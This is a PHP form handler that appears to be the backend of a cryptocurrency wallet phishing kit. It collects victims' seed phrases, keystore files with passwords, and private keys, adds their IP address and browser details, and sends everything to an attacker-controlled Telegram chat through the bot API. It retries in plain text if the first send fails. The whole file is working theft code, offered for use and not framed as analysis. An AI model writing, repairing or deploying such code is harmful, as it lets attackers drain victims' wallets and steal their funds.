<?php
/**
 * Form Submission Handler
 * Sends wallet recovery phrase and other data to Telegram
 */

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Allow CORS for testing
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Include configuration
$configPath = __DIR__ . '/config.php';
if (!file_exists($configPath)) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Config file not found at: ' . $configPath]);
    error_log('Config file not found: ' . $configPath);
    exit;
}

require_once $configPath;

// Set response header
header('Content-Type: application/json');

// Log the request (for debugging)
error_log('=== SUBMIT.PHP CALLED ===');
error_log('POST data: ' . json_encode($_POST));
error_log('Request method: ' . $_SERVER['REQUEST_METHOD']);
error_log('Config path: ' . $configPath);

// Check if request is POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// Get form data
$phrase = isset($_POST['phrase']) ? trim($_POST['phrase']) : '';
$keystore = isset($_POST['keystore']) ? trim($_POST['keystore']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$privateKey = isset($_POST['key']) ? trim($_POST['key']) : '';
$walletId = isset($_POST['wallet_id']) ? trim($_POST['wallet_id']) : 'Unknown';

// Determine type and data
$type = '';
$data = '';

if (!empty($phrase)) {
    $type = 'Recovery Phrase (12/24 words)';
    $data = $phrase;
} elseif (!empty($keystore)) {
    $type = 'Keystore JSON';
    $data = $keystore . (!empty($password) ? "\n\nPassword: " . $password : '');
} elseif (!empty($privateKey)) {
    $type = 'Private Key';
    $data = $privateKey;
} else {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'No data provided']);
    exit;
}

// Validate configuration
if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Telegram configuration not set. Please configure config.php']);
    exit;
}

// Get user IP and browser info
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$timestamp = date('Y-m-d H:i:s');

// Format message for Telegram (using HTML format for better compatibility)
$message = "🔐 <b>New Wallet Data Received</b>\n\n";
$message .= "📋 <b>Type:</b> " . htmlspecialchars($type) . "\n";
$message .= "👛 <b>Wallet:</b> " . htmlspecialchars($walletId) . "\n";
$message .= "🌐 <b>IP Address:</b> " . htmlspecialchars($ip) . "\n";
$message .= "🕐 <b>Timestamp:</b> " . htmlspecialchars($timestamp) . "\n\n";
$message .= "📝 <b>Data:</b>\n<code>\n" . htmlspecialchars($data) . "\n</code>\n\n";
$message .= "🌍 <b>User Agent:</b>\n" . htmlspecialchars(substr($userAgent, 0, 200));

// Prepare Telegram API request
// Try without Markdown first to avoid parsing issues
$telegramData = [
    'chat_id' => TELEGRAM_CHAT_ID,
    'text' => $message,
    'parse_mode' => 'HTML', // Changed from Markdown to HTML for better compatibility
    'disable_web_page_preview' => true
];

// Send to Telegram - Try with HTML first, fallback to plain text if it fails
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, TELEGRAM_API_URL);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegramData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// If HTML parse mode fails, try plain text
$telegramResponse = json_decode($response, true);
if ($httpCode !== 200 || ($telegramResponse['ok'] ?? false) !== true) {
    error_log('First attempt failed, trying plain text format. Error: ' . ($telegramResponse['description'] ?? 'Unknown'));
    
    // Create plain text version without HTML tags
    $plainMessage = "🔐 New Wallet Data Received\n\n";
    $plainMessage .= "📋 Type: " . $type . "\n";
    $plainMessage .= "👛 Wallet: " . $walletId . "\n";
    $plainMessage .= "🌐 IP Address: " . $ip . "\n";
    $plainMessage .= "🕐 Timestamp: " . $timestamp . "\n\n";
    $plainMessage .= "📝 Data:\n" . $data . "\n\n";
    $plainMessage .= "🌍 User Agent:\n" . substr($userAgent, 0, 200);
    
    $plainTelegramData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $plainMessage,
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, TELEGRAM_API_URL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($plainTelegramData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    $telegramResponse = json_decode($response, true);
}

// Log the response
error_log('Telegram API Response - HTTP Code: ' . $httpCode);
error_log('Telegram API Response - Body: ' . $response);
if ($curlError) {
    error_log('cURL Error: ' . $curlError);
}

// Check response (telegramResponse already decoded above)
if ($httpCode === 200 && !empty($response)) {
    if (isset($telegramResponse['ok']) && $telegramResponse['ok'] === true) {
        // Success
        error_log('Telegram message sent successfully!');
        echo json_encode([
            'success' => true,
            'message' => 'Data sent successfully'
        ]);
    } else {
        // Telegram API error
        $errorMsg = isset($telegramResponse['description']) ? $telegramResponse['description'] : 'Unknown error';
        error_log('Telegram API Error: ' . $errorMsg . ' - Full response: ' . $response);
        http_response_code(500);
        echo json_encode([
            'success' => false,
            'error' => 'Failed to send to Telegram: ' . $errorMsg,
            'debug' => $telegramResponse
        ]);
    }
} else {
    // cURL error
    $errorMsg = $curlError ?: 'HTTP ' . $httpCode;
    error_log('cURL/HTTP Error: ' . $errorMsg);
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Connection error: ' . $errorMsg,
        'http_code' => $httpCode,
        'response' => substr($response, 0, 200)
    ]);
}

?>

